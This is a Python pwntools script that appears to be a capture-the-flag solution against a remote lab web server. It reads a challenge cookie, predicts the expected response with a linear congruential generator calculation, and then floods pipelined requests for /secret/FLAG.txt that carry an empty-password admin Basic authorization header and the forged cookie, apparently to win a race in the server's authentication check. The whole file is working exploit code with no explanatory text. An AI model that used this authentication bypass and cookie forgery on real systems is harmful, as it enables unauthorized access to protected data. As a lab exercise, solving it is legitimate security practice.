from base64 import b64encode

from pwn import process, remote

MAX_CONCURRENT = 1000
MAX_UNSIGNED_LONG = 0xFFFFFFFFFFFFFFFF


def connect():
    return remote("up.zoolab.org", 10933)


def has_flag(r: remote):
    r.recvuntil(b"Content-Length: ")
    length = int(r.recvline(keepends=False).decode())
    r.recvline()

    msg = ""
    if length > 0:
        msg = r.recvline().decode(errors="ignore")
    return ("FLAG" in msg, msg)


def solve(r: remote):
    r.newline = b"\r\n"

    # get challenge
    r.sendline(b"GET /secret/FLAG.txt")
    r.sendline()
    r.recvuntil(b"Set-Cookie: challenge=")
    challenge = int(r.recvuntil(b";", drop=True).decode())
    r.recvline_startswith(b"Content-Length:")
    r.recvline()

    # solve challenge
    challenge = (challenge * 6364136223846793005) & MAX_UNSIGNED_LONG
    challenge = (challenge + 1) & MAX_UNSIGNED_LONG
    challenge = (challenge >> 33) & MAX_UNSIGNED_LONG

    for _ in range(499):
        r.sendline(b"GET /")
        r.sendline()

        r.sendline(b"GET /secret/FLAG.txt")
        r.sendline(b"Authorization: Basic " + b64encode(b"admin:"))
        r.sendline(f"Cookie: response={challenge}".encode())
        r.sendline()

        msg = r.recvline_startswith(delims=b"FLAG", timeout=0.01).decode()
        if len(msg) > 0:
            break

    print(msg)

    r.close()


if __name__ == "__main__":
    ## for remote access
    r = remote("up.zoolab.org", 10933)

    # r = remote("127.0.0.1", 10933)
    solve(r)
